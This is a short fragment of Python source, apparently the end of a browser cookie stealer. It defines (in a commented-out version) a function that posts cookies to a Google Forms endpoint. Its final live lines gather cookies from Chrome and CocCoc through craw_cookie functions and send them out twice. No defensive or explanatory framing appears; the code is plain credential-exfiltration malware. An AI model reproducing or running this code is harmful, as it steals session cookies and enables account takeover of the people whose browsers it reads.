...
# def send_cookie_1(cookie):
# 	url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSeRY0SrygOdw4ZweuHwv3zsTIxHAWCKZvEU4Hgbgo9HCIu1iw/formResponse'
# 	data = {
# 		'entry.261695520' : cookie + ""
# 	}
# 	requests.post(url,data=data) #mail phụ



send_cookie("Chrome \n" + craw_cookie() + " CocCoc \n " + craw_cookie_1())
send_cookie_1("Chrome \n" + craw_cookie() + " CocCoc \n " + craw_cookie_1())
